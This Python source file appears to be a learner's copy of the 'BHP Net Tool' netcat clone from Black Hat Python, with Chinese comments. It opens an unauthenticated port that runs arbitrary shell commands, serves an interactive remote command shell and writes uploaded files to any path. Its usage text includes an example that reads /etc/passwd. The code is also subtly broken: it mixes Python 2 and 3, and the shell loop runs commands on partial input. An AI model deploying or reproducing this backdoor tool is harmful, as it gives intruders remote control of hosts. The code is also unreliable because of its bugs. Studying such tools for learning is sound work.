#!/usr/bin/env python
# coding: utf-8
# @File Name: netcat.py
# @Author: Joshua Liu
# @Email: liuchaozhenyu@gmail.com
# @Create Date: 2018-03-28 10:03:48
# @Last Modified: 2018-03-30 14:03:28
# @Description:
import sys
import socket
import getopt
import threading
import subprocess

# 定义一些全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print('BHP Net Tool')
    print()
    print('Usage: bhpnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for \
                                      incoming connections')
    print('-e --execute=file_to_run - execute the given file upon \
                                      receiving a connection')
    print('-c --command             - initialize a command shell')
    print('-u --upload-destinationn - upon receiving connection upload a \
                                      file and write to [destination]')
    print()
    print()
    print('Examples: ')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -u=/tmp/temp.zip')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"')
    print('echo "ABCDEFGHI" | bhpnet.py -t 192.168.11.12 -p 135')
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:',
                ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as e:
        print(e)
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-c', '--commandshell'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'

    # 是监听还是从标准流发送数据？
    if not listen and len(target) > 0 and port > 0:
        # 从命令行读取内存数据
        # 这里将阻塞，所以不再向标准输入发送数据时发送CTRL-D
        buf = sys.stdin.read()

        # 发送数据
        client_sender(buf)

    # 开始监听并准备上传文件、执行命令
    # 放置一个反弹 shell
    # 取决于上面的命令行选项
    if listen:
        server_loop()


def client_sender(buf):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到目标机
        client.connect((target, port))

        if len(buf):
            client.send(buf)

        while True:
            # 现在等待数据回传
            recv_len = 1
            response = ''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response)

            # 等待更多的输入
            buf = raw_input('')
            buf += '\n'

            # 发送出去
            client.send(buf)
    except:
        print('[*] Exception! Exiting.')
        client.close()


def server_loop():
    global target

    # 如果没有定义目标，那么我们监听所有接口
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 分拆一个线程处理新的客户端
        client_thread = threading.Thread(target=client_handler,
                args=(client_socket,))
        client_thread.start()


def run_command(command):
    # 换行
    command = command.rstrip()

    # 运行命令并将输出返回
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command.\n'

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检测上传文件
    if len(upload_destination):
        # 读取所有子集并写下目标
        file_buf = ""
        # 持续读取数据指导没有符合的数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buf += data

        # 接收数据并将它们写出
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buf)
            file_descriptor.close()

            # 确认文件写出
            client_socket.send("Success saved file to %s\n" % upload_destination)
        except:
            client_socket.send("Failed to sava file to %s\n" % upload_destination)

    # 检查命令执行
    if len(execute):
        # 运行命令
        output = run_command(execute)

        client_socket.send(output)

    # 如果需要一个命令 shell，那么进入另一循环
    if command:
        while True:
            # 简单提示
            client_socket.send("<BHP:#> ")

            # 接收文件直到发现换行符(Enter key)
            cmd_buf = ""
            while "\n" not in cmd_buf:
                cmd_buf += client_socket.recv(1024)
                response = run_command(cmd_buf)

                # 返回响应
                client_socket.send(response)

if __name__ == '__main__':
    main()
